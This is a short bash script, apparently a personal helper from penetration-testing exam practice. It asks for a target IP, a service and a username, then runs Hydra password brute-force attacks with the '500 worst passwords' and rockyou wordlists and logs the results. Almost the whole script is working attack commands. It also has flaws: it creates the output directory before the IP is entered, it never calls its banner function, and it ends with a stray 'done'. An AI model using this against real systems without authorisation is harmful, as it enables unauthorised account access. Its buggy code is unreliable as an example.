#!/bin/bash

  # Colours
  ESC="\e["
  RESET=$ESC"39m"
  RED=$ESC"31m"
  GREEN=$ESC"32m"
  BLUE=$ESC"34m"
  YELLOW=$ESC"33m"

  function enumeraton_scan {
  echo ""
  echo "               w-------------------------------------------------------------w"
  echo "               |                                                             |"
  echo "               |                    Hydra brute scan                         |"
  echo "               |                                                      -t911  |"
  echo "               w-------------------------------------------------------------w"
  echo ""
}

mkdir -p /root/exam/brute_scans/$ip/

printf "Enter IP: \n"
read ip
printf "Enter Port eg. ssh, ftp. smtp (words only) etc \n"
printf "Enter Port: \n"
read port 
printf "Enter user: \n"
read user

printf "Now brute forcing with 500 worst password on $ip...\n"
hydra -l $user -P /root/wordlists/500-worst-passwords.txt $port://$ip \
>> /root/exam/brute_scans/$ip/hydra_scan_$ip.txt

sleep 2;

printf "Now brute forcing with rockyou on $ip..\n"
hydra -l $user -P /root/wordlists/rockyou.txt $port://$ip \
>> /root/exam/brute_scans/$ip/hydra_scan_$ip.txt

sleep 2;

printf "If now success, determine if you have CeWL a password list\n"
printf "All results located at /root/exam/IP_Address/"
done
exit